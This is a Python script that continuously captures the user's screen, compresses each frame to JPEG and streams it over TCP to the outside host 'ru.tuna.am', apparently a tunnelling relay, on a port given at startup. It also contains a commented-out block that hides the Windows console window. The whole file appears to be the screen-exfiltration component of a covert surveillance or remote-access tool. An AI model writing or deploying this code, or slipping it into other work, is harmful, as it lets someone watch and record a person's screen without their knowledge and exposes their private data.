import socket
import cv2
import numpy as np
from mss import mss
import ctypes
import sys

PORT = int(input())
SERVER_IP = 'ru.tuna.am' 


"""
# Hiding window visibility on the console (Windows).
if sys.platform == "win32":
    hwnd = ctypes.windll.kernel32.GetConsoleWindow()
    if hwnd:
        ctypes.windll.user32.ShowWindow(hwnd, 0)   
"""                       
def capture_screen():
    with mss() as sct:
        monitor = sct.monitors[1]
        print(f"Screen capture: {monitor['width']}x{monitor['height']}")
        
        while True:
            try:
                img = sct.grab(monitor)
                frame = np.array(img)
                frame = cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR)
                yield frame
            except Exception as e:
                print(f"Capture error: {e}")
                break

def main():
    print(f"An attempt to connect to {SERVER_IP}:{PORT}")
    
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(15)
            
            s.connect((SERVER_IP, PORT))
            print("Connection is established!")
            
            for frame in capture_screen():
                success, buffer = cv2.imencode('.jpg', frame, [
                    int(cv2.IMWRITE_JPEG_QUALITY), 60
                ])
                
                if not success:
                    continue
                    
                frame_data = buffer.tobytes()
                size = len(frame_data)
                
                s.sendall(size.to_bytes(4, 'big'))
                s.sendall(frame_data)
                
    except socket.gaierror:
        print(f"ERROR: Address cannot be resolved '{SERVER_IP}'")
    except socket.timeout:
        print("Connection timeout")
    except ConnectionRefusedError:
        print("The server rejected the connection")
    except OSError as e:
        print(f"Network error: {e}")
    except Exception as e:
        print(f"Unknown error: {e}")
    finally:
        print("The client is shutting down...")

if __name__ == "__main__":
    main()